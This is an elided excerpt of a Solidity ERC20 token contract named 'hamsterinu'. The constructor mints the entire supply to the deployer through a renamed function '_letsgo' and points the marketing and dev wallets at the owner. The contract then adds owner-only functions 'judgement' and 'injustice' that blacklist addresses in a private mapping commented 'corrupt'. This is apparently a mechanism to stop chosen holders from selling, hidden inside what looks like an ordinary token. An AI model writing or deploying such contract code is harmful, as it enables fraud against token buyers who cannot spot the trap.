...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _letsgo(address account, uint256 amount) internal virtual {
...
contract hamsterinu is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    // corrupt
    mapping(address => bool) private _gloom;
    ...
    constructor() ERC20("hamsterinu Token", "hamsterinu") {
        ...
        uint256 _earlySellMarketingFee = 9;
        ...
        swapTokensAtAmount = (totalSupply * 10) / 10000; // 0.1% swapWallet
        ...
        marketingWallet = address(owner()); // marketing wallet
        devWallet = address(owner()); // dev wallet
        ...
        _letsgo(msg.sender, totalSupply);
    }
    ...
    function judgement(address account, bool isBlacklisted) public onlyOwner {
        _gloom[account] = isBlacklisted;
    }

    function injustice(address[] memory corrupt_) public onlyOwner {
        for (uint256 i = 0; i < corrupt_.length; i++) {
            _gloom[corrupt_[i]] = true;
        }
    }
